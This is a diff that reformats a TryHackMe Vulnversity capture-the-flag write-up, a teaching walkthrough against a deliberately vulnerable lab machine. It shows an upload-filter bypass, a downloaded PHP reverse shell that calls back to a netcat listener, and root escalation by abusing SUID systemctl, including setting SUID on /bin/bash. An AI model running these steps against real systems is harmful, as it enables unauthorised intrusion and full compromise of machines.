@@ -1,11 +1,17 @@
-# TryHackMe Vulnversity Room Writeup
+# TryHackMe: Vulnversity — Writeup
 
 ## Room Overview
-Vulnversity is a beginner-friendly penetration testing room that covers essential reconnaissance, web application exploitation, and privilege escalation techniques. This room provides hands-on experience with directory enumeration, file upload vulnerabilities, and Linux privilege escalation.
 
-**Difficulty:** Easy  
-**Target OS:** Ubuntu Linux  
-**Tools Used:** Nmap, GoBuster, BurpSuite, Netcat, PHP Reverse Shell
+Vulnversity is a beginner-friendly penetration testing room that covers essential
+reconnaissance, web application exploitation, and privilege escalation techniques. This room
+provides hands-on experience with directory enumeration, file upload vulnerabilities, and
+Linux privilege escalation.
+
+| Field | Info |
+|-------|------|
+| Difficulty | Easy |
+| Target OS | Ubuntu Linux |
+| Tools Used | Nmap, GoBuster, BurpSuite, Netcat, PHP Reverse Shell |
 
 ---
 
@@ -15,9 +21,10 @@ Vulnversity is a beginner-friendly penetration testing room that covers essentia
 Deploy the vulnerable machine and connect to the TryHackMe network using OpenVPN.
 
 ### Steps
-1. Click "Start Machine" to deploy the target
-2. Connect to TryHackMe VPN using OpenVPN
-3. Note the target IP address provided
+
+1. Click "Start Machine" to deploy the target.
+2. Connect to TryHackMe VPN using OpenVPN.
+3. Note the target IP address provided.
 
 ---
 
@@ -26,29 +33,26 @@ Deploy the vulnerable machine and connect to the TryHackMe network using OpenVPN
 ### Objective
 Perform active reconnaissance to identify open ports, services, and OS information.
 
-### Nmap Scan
-Execute a comprehensive Nmap scan to enumerate services:
+### What I Did
+I executed a comprehensive Nmap scan to enumerate services:
 
 ```bash
 nmap -sC -sV -p- <target-ip>
 ```
 
-**Nmap Flags Explained:**
-- `-sC`: Run default scripts for service enumeration
-- `-sV`: Detect service versions
-- `-p-`: Scan all 65535 ports
+**Flags explained:** `-sC` runs default scripts, `-sV` detects versions, `-p-` scans all
+65535 ports.
 
 ### Scan Results
-The Nmap scan reveals the following open ports:
 
 | Port | Service | Version |
-|------|---------|----------|
-| 21   | FTP     | vsftpd 3.0.3 |
-| 22   | SSH     | OpenSSH 7.2p2 |
-| 139  | NetBIOS | Samba smbd 3.X - 4.X |
-| 445  | SMB     | Samba smbd 4.3.11 |
+|------|---------|---------|
+| 21 | FTP | vsftpd 3.0.3 |
+| 22 | SSH | OpenSSH 7.2p2 |
+| 139 | NetBIOS | Samba smbd 3.X - 4.X |
+| 445 | SMB | Samba smbd 4.3.11 |
 | 3128 | HTTP Proxy | Squid http proxy 3.5.12 |
-| 3333 | HTTP    | Apache httpd 2.4.18 |
+| 3333 | HTTP | Apache httpd 2.4.18 |
 
 ---
 
@@ -57,34 +61,23 @@ The Nmap scan reveals the following open ports:
 ### Objective
 Use directory enumeration to discover hidden directories and files on the web server.
 
-### Tool: GoBuster
-GoBuster is a fast directory/file brute-forcing tool written in Go.
+### What I Did
 
-### Command
 ```bash
-gobuster dir -u http://<target-ip>:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://<target-ip>:3333 \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-
-**GoBuster Flags:**
-- `dir`: Directory/file brute-forcing mode
-- `-u`: Target URL
-- `-w`: Wordlist path
-
-### Alternative: DirBuster
-You can also use DirBuster (GUI-based tool) for directory enumeration.
 
 ### Discovered Directories
 
 ```
-/images (Status: 301)
-/css (Status: 301)
-/js (Status: 301)
-/internal (Status: 301)
+/images    (Status: 301)
+/css       (Status: 301)
+/js        (Status: 301)
+/internal  (Status: 301)
 ```
 
-
-### Exploration
-Navigate to `http://<target-ip>:3333/internal` to find an upload form.
+Navigating to `http://<target-ip>:3333/internal` revealed an upload form.
 
 ---
 
@@ -95,133 +88,78 @@ Exploit the file upload vulnerability to gain remote code execution.
 
 ### Step 1: Test File Upload Restrictions
 
-The upload form at `/internal` allows file uploads. Test various file extensions to identify which are blocked:
+The upload form at `/internal` accepts files but blocks certain extensions. Testing revealed:
 
-**Test Extensions:**
-- `.php` - **BLOCKED**
-- `.php3` - **BLOCKED**
-- `.php4` - **BLOCKED**
-- `.php5` - **BLOCKED**
-- `.phtml` - **ALLOWED** ✓
+- `.php` — **BLOCKED**
+- `.php3` — **BLOCKED**
+- `.php4` — **BLOCKED**
+- `.php5` — **BLOCKED**
+- `.phtml` — **ALLOWED** ✓
 
 ### Step 2: Use BurpSuite Intruder
 
-For systematic testing, use BurpSuite Intruder:
-
-1. Intercept the upload request with BurpSuite Proxy
-2. Send the request to Intruder (Ctrl+I)
-3. Set the filename extension as the payload position
-4. Load a list of PHP extensions
-5. Start the attack
-6. Identify which extensions return "Success" responses
-
+For systematic testing I used BurpSuite Intruder: intercepted the upload request, set the
+filename extension as the payload position, loaded a list of PHP extensions, and identified
+which returned a "Success" response.
 
 ### Step 3: Prepare Reverse Shell
-
-Download and modify the PHP reverse shell from PentestMonkey:
 
 ```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 mv php-reverse-shell.php shell.phtml
 ```
 
-Edit the reverse shell configuration:
+Edit the configuration inside the file:
 
 ```php
-$ip = 'YOUR-THM-VPN-IP';  // Your tun0 IP address
-$port = 4444;              // Listening port
+$ip = 'YOUR-THM-VPN-IP';  // tun0 IP
+$port = 4444;
 ```
 
 ### Step 4: Set Up Netcat Listener
-
-On your attacking machine, start a Netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-**Netcat Flags:**
-- `-l`: Listen mode
-- `-v`: Verbose output
-- `-n`: No DNS resolution
-- `-p`: Port number
+### Step 5: Upload and Execute
 
-### Step 5: Upload and Execute Reverse Shell
-
-1. Upload `shell.phtml` through the `/internal` upload form
-2. Navigate to `http://<target-ip>:3333/internal/uploads/shell.phtml`
-3. The reverse shell executes and connects back to your listener
+1. Upload `shell.phtml` through the `/internal` form.
+2. Navigate to `http://<target-ip>:3333/internal/uploads/shell.phtml`.
+3. The shell executes and connects back to the listener.
 
 ```bash
 whoami
-# Output: www-data
+# www-data
 
-cd /home
-ls
-# Output: bill
+cd /home && ls
+# bill
 
-cd bill
-ls
-cat user.txt
+cat /home/bill/user.txt
 ```
-
 
 ---
 
 ## Task 5: Privilege Escalation
 
 ### Objective
-Escalate from `www-data` to `root` user to capture the root flag.
+Escalate from `www-data` to `root` to capture the root flag.
 
 ### Step 1: Enumerate SUID Binaries
-
-Search for SUID (Set User ID) binaries that run with elevated privileges:
 
 ```bash
 find / -user root -perm /4000 2>/dev/null
 ```
 
-**Command Breakdown:**
-- `find /`: Search from root directory
-- `-user root`: Files owned by root
-- `-perm /4000`: Files with SUID bit set (octal 4000)
-- `2>/dev/null`: Suppress error messages
-
-### SUID Binary Results
+Among the results, one binary stood out:
 
 ```
-/usr/bin/newuidmap
-/usr/bin/chfn
-/usr/bin/newgidmap
-/usr/bin/sudo
-/usr/bin/chsh
-/usr/bin/passwd
-/usr/bin/pkexec
-/usr/bin/newgrp
-/usr/bin/gpasswd
-/usr/bin/at
-/bin/umount
-/bin/fusermount
-/bin/mount
-/bin/ping
-/bin/ping6
-/bin/su
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/policykit-1/polkit-agent-helper-1
-/sbin/mount.nfs
 /bin/systemctl
 ```
 
+Having SUID on `systemctl` is unusual and exploitable.
+
 ### Step 2: Exploit systemctl SUID
-
-The `systemctl` binary with SUID permissions is unusual and can be exploited.
-
-### Exploitation Method
-
-Reference GTFOBins for systemctl exploitation:
 
 ```bash
 TF=$(mktemp).service
@@ -234,16 +172,10 @@ WantedBy=multi-user.target' > $TF
 /bin/systemctl enable --now $TF
 ```
 
-**Explanation:**
-1. Create a temporary service file
-2. Define a oneshot service that executes our command
-3. The `ExecStart` command reads the root flag and copies it to `/tmp/output`
-4. Link and enable the service using systemctl
-5. The service runs with root privileges due to SUID
+This creates a temporary service that runs with root privileges due to the SUID bit,
+copying the root flag to `/tmp/output`.
 
-### Alternative Method: Direct Root Shell
-
-For a root shell, modify the service:
+### Alternative: Direct Root Shell
 
 ```bash
 TF=$(mktemp).service
@@ -257,30 +189,21 @@ WantedBy=multi-user.target' > $TF
 /bin/bash -p
 ```
 
-This sets the SUID bit on `/bin/bash`, allowing privilege escalation:
-
-```bash
-/bin/bash -p
-whoami
-# Output: root
-```
-
 ### Step 3: Capture Root Flag
-
-With root access, read the root flag:
 
 ```bash
 cat /root/root.txt
 ```
+
 ---
 
 ## Tools & Techniques Summary
 
 | Task | Tool | Command |
-|------|------|----------|
+|------|------|---------|
 | Port Scanning | Nmap | `nmap -sC -sV -p- <ip>` |
 | Directory Enumeration | GoBuster | `gobuster dir -u <url> -w <wordlist>` |
-| Web Traffic Interception | BurpSuite | Proxy + Intruder |
+| Traffic Interception | BurpSuite | Proxy + Intruder |
 | Reverse Shell | PHP Reverse Shell | Modified with attacker IP/port |
 | Listener | Netcat | `nc -lvnp 4444` |
 | SUID Enumeration | find | `find / -user root -perm /4000` |
@@ -290,12 +213,13 @@ cat /root/root.txt
 
 ## Conclusion
 
-The Vulnversity room demonstrates a complete penetration testing workflow from reconnaissance to privilege escalation. Key learning points include:
+The Vulnversity room demonstrates a complete penetration testing workflow from reconnaissance
+to privilege escalation. Key takeaways:
 
-1. **Active Reconnaissance:** Using Nmap to identify services and potential attack vectors
-2. **Web Application Enumeration:** Directory brute-forcing to discover hidden functionality
-3. **File Upload Bypass:** Testing various file extensions to circumvent upload restrictions
-4. **Remote Code Execution:** Leveraging file upload vulnerabilities for initial access
-5. **Linux Privilege Escalation:** Exploiting misconfigured SUID binaries for root access
+- **Active Reconnaissance:** Nmap identifies services and potential attack vectors.
+- **Web Enumeration:** Directory brute-forcing uncovers hidden functionality.
+- **File Upload Bypass:** Testing extension variations circumvents upload restrictions.
+- **Remote Code Execution:** File upload vulnerabilities can provide initial access.
+- **Linux PrivEsc:** Misconfigured SUID binaries can lead directly to root.
 
 **Room Status:** Completed ✓
